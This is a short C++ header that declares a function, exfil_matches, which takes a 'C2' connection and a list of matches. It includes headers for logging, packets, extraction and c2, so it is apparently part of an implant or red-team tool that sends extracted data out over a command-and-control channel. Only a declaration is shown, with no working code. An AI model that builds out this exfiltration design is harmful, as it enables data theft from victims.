#pragma once
#include "../logging/logging.h"
#include "packet.h"
#include "../extract/match.h"
#include "../c2/c2.h"
#include "vector"

void exfil_matches(C2 &c2con,std::vector<Match>& mvec);